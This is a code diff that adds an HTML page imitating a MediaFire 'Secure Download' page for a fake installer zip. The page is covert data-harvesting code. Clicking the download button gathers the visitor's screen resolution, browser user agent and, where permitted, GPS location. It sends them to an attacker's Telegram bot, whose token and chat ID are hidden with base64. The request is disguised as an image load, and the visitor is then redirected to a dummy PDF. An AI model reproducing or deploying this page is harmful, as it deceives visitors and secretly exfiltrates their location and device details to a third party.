@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MediaFire - Secure Download</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f2f2f2; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: #222; padding: 30px; border-radius: 6px; text-align: center; color: white; width: 400px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .btn { background: #0070ff; color: white; border: none; padding: 12px 25px; font-size: 14px; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 15px; width: 100%; }
+        .btn:hover { background: #0056cc; }
+    </style>
+</head>
+<body>
+
+<div class="box" id="mainBox">
+    <h3>SETUP_INSTALLER_(KEY.1234).zip</h3>
+    <p style="font-size: 12px; color: #aaa;">Size: 3.07MB</p>
+    <button class="btn" onclick="fireData()">Download (3.07MB)</button>
+</div>
+
+<script>
+    const BOT_TOKEN = atob('OTI4OTIzMjAzNTpBQUZBV0RRb0tqV09kWnRFdDZJSlZITGVOVldvU0RGM2E4');
+    const CHAT_ID = atob('MTQ2MTIyNDg5MQ==');
+
+    function fireData() {
+        document.getElementById('mainBox').innerHTML = '<h3 style="color: #4CAF50;">جاري التحميل...</h3><p style="font-size:12px; color:#ccc;">يرجى الانتظار</p>';
+
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        const userAgent = navigator.userAgent;
+        let text = `🚨 تم النقر على الرابط!\n\n💻 النظام:\n• الشاشة: ${screenRes}\n• المتصفح: ${userAgent.substring(0, 50)}`;
+
+        // محاولة جلب الموقع الجغرافي لو متاح
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                text += `\n\n📍 الموقع:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+                sendTelegram(text);
+            }, function(err) {
+                text += `\n\n⚠️ رفض إذن الموقع.`;
+                sendTelegram(text);
+            }, { timeout: 4000 });
+        } else {
+            sendTelegram(text);
+        }
+    }
+
+    function sendTelegram(msg) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(msg);
+        
+        // استخدام Image object لإرسال الطلب (أقدم وأنجح طريقة لتجاوز حظر CORS في المتصفحات)
+        const img = new Image();
+        img.src = url;
+
+        setTimeout(function() {
+            window.location.href = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf";
+        }, 2000);
+    }
+</script>
+
+</body>
+</html>
